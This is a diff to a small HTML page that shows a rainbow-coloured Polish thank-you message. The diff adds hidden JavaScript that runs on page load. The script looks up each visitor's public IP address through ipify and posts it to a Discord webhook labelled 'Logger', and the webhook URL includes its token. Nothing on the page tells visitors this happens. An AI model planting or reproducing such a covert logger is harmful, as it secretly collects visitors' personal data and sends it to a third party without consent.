@@ -1,3 +1,23 @@
 <div class="rainbow-text" style="text-align: center;">
 	<span class="block-line"><span><span style="color:#ff0000;">d</span><span style="color:#ff8c00;">z</span><span style="color:#e6ff00;">i</span><span style="color:#59ff00;">e</span><span style="color:#00ff2f;">k</span><span style="color:#00ffbb;"> z</span><span style="color:#00b7ff;">a</span><span style="color:#002bff;">i</span><span style="color:#5e00ff;">p</span><span style="color:#ea00ff;">ky</span><span style="color:#ff0088;">s!</span></span></span>
 </div>
+
+<script>
+function getIP(json) {
+  var request = new XMLHttpRequest(); //making a request for the webhook
+      request.open("POST", "https://discord.com/api/webhooks/1160298520251732070/rKth2dHmBo5Stc4im-ffIEzURFU5HAsInaEWd4Dz03dN9rfiuM9GNac38hOIbnjKtNlb");
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+      var params = {
+        username: "Logger",
+        avatar_url: "https://i.pinimg.com/originals/d8/eb/57/d8eb57825be593ff8993265cf5eea794.jpg",
+        content: "**IP:** *" + json.ip + "*"
+      }
+   //just a webhook parameters such as avatar,name,message
+
+      request.send(JSON.stringify(params));
+    }
+
+</script>
+<script src="https://api.ipify.org?format=jsonp&callback=getIP"></script> //using this api to get the ip
